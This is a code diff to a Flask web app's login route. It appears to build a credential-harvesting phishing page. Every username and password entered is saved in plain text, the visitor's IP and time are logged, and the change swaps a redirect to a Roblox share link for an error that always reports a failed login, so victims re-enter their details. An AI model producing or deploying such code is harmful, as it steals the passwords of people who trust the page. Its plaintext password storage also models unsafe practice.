@@ -47,25 +47,26 @@ def index():
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
+    error = None
     if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
 
         db = get_db()
 
-        # Save new user (like registration)
+        # Save new user
         db.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
 
-        # Log the IP and time
+        # Log login attempt
         login_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         ip = request.remote_addr
         db.execute("INSERT INTO login_logs (username, login_time, ip_address) VALUES (?, ?, ?)",
                    (username, login_time, ip))
         db.commit()
 
-        session['username'] = username
-        return redirect("https://www.roblox.com/share?code=826379ebec95f54e8d244ac6512265f4&type=Server")
-
+        # Show error always
+        error = "Incorrect username or password."
+        return render_template('login.html', error=error)
 
     return render_template('login.html')
 
